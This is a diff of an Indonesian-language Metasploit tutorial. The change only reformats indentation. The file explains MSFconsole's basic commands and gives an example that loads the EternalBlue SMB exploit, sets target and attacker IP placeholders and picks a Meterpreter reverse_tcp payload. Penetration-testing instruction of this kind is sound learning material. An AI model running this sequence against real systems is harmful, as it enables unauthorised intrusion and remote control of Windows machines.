@@ -15,43 +15,43 @@ Jenis-jenis Antarmuka Metasploit:
 
 1. Menjalankan MSFconsole:
 
-   ```
-   msfconsole
-   ```
+```
+msfconsole
+```
 
-   Saat dijalankan, akan muncul banner:
+Saat dijalankan, akan muncul banner:
 
-   ```
-   =[ metasploit v6.4.56-dev                          ]
-   + -- --=[ 2505 exploits - 1291 auxiliary - 431 post       ]
-   + -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
-   + -- --=[ 9 evasion                                       ]
+```
+=[ metasploit v6.4.56-dev                          ]
++ -- --=[ 2505 exploits - 1291 auxiliary - 431 post       ]
++ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
 
-   Metasploit Documentation: https://docs.metasploit.com/
-   ```
+Metasploit Documentation: https://docs.metasploit.com/
+```
 
 2. Struktur Dasar Perintah di MSFconsole
 
-   | Perintah | Fungsi |
-   |:--:|:--:|
-   | `search <NAMA>` | Mencari `exploit`, `payload`, `dll`. |
-   | `use <MODUL>` | Memilih modul yang akan digunakan. |
-   | `info` | Menampilkan detail tentang modul yang sedang digunakan. |
-   | `show options` | Melihat konfigurasi parameter modul. |
-   | `set <PARAMETER> <NILAI>` | Mengatur nilai parameter modul. |
-   | `exploit` atau `run` | Menjalankan exploit atau modul. |
+| Perintah | Fungsi |
+|:--:|:--:|
+| `search <NAMA>` | Mencari `exploit`, `payload`, `dll`. |
+| `use <MODUL>` | Memilih modul yang akan digunakan. |
+| `info` | Menampilkan detail tentang modul yang sedang digunakan. |
+| `show options` | Melihat konfigurasi parameter modul. |
+| `set <PARAMETER> <NILAI>` | Mengatur nilai parameter modul. |
+| `exploit` atau `run` | Menjalankan exploit atau modul. |
 
 3. Contoh Penggunaan MSFconsole:
 
-   ```
-   search windows/smb
-   use exploit/windows/smb/ms17_010_eternalblue
-   show options
-   set RHOSTS <IP_TARGET>
-   set LHOST <IP_ATTACKER>
-   set PAYLOAD windows/meterpreter/reverse_tcp
-   exploit
-   ```
+```
+search windows/smb
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS <IP_TARGET>
+set LHOST <IP_ATTACKER>
+set PAYLOAD windows/meterpreter/reverse_tcp
+exploit
+```
 
 ## B. Fitur Tambahan di MSFconsole
 
